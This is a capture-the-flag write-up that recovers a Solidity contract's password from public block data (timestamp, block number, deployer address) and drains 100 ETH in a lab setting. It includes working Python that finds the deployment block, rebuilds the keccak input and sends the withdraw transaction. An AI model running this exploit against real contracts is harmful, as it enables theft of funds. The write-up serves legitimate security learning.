# Just in Time - Writeup

## Overview

This was a blockchain challenge where we needed to withdraw 100 ETH from a contract. The contract required a password, and it looked like the password was never saved anywhere. But after reading the source, I noticed that the password was made using blockchain information. So we can calculate it again.

## Looking at the contracts

In `Setup.sol`, the contract deploys `Chal` with 100 ETH. The solve condition is simple: the target contract must have zero ETH left.

```solidity
TARGET = new Chal{value: 100 ether}();

function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```

Then I checked the constructor in `Chal.sol`.

```solidity
uint256 password = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, msg.sender)));
passwordHash = keccak256(abi.encodePacked(password));
```

The contract only stores the hash of the password, which sounds safe at first. However, the password itself is generated from `block.timestamp`, `block.number`, and `msg.sender`. These values are not secret.

Also, the `msg.sender` here is the **Setup contract**, because Setup creates Chal using `new Chal`. It is not our wallet address.

The withdrawal function checks the password hash and sends all ETH to the caller:

```solidity
function withdraw(uint256 password) external {
    require(keccak256(abi.encodePacked(password)) == passwordHash, "Wrong password");
    payable(msg.sender).transfer(address(this).balance);
}
```

So basically, we only need to recreate the original password.

## Finding the deployment block

First, I connected to the RPC and got the target address from `Setup.TARGET()`.

To get the original timestamp and block number, I searched for the first block where the Setup contract has code. I used binary search with `eth_getCode`, because before deployment the address has no contract code.

```python
left = 0
right = w3.eth.block_number

while left < right:
    mid = (left + right) // 2
    code = w3.eth.get_code(setup_address, block_identifier=mid)
    if len(code) > 0:
        right = mid
    else:
        left = mid + 1

block_number = left
timestamp = w3.eth.get_block(block_number)['timestamp']
```

In my instance, Setup was deployed in block `2`, and the timestamp was `1794589785`. Since Setup creates Chal in its constructor, Chal was created in the same block.

## Recreating the password

The important part is matching Solidity's `abi.encodePacked` format. Both `uint256` values use 32 bytes, and the address uses 20 bytes.

```python
data = timestamp.to_bytes(32, 'big')
data += block_number.to_bytes(32, 'big')
data += bytes.fromhex(setup_address[2:])
password = int.from_bytes(Web3.keccak(data), 'big')
```

This gave me the password:

```text
52635545700545010668511226670600577053473789290140292979744023357912244776494
```

Before sending a transaction, I tested `withdraw(password)` using `eth_call`. It did not revert, so the password was correct.

## Withdrawing the ETH

After that, I just built a transaction for `withdraw(password)` and signed it with the account given by the challenge.

```python
tx = chal.functions.withdraw(password).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'chainId': w3.eth.chain_id,
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

The transaction succeeded. I checked `Setup.isSolved()` and it returned `True`. The target balance also became `0 ETH`.

```text
[+] Deployment block: 2
[+] Timestamp: 1794589785
[+] Password verified
[+] Receipt status: 1
[+] Solved: True
[+] Remaining balance: 0 ETH
```

Then I connected to the challenge server again and selected option `3` to get the flag.

## Flag

```text
PP{t1m3_15_n0t_4_s3cr3t::-xyKhdTOyOB3}
```

## Conclusion

The mistake was using public blockchain values to generate something that was supposed to be secret. Hashing the password and storing only its hash did not help, because anyone could recreate the original input.

I didn't need to reverse Keccak or brute-force anything. Just finding the deployment block and reproducing `abi.encodePacked` was enough. Pretty straightforward once I noticed how the password was generated.
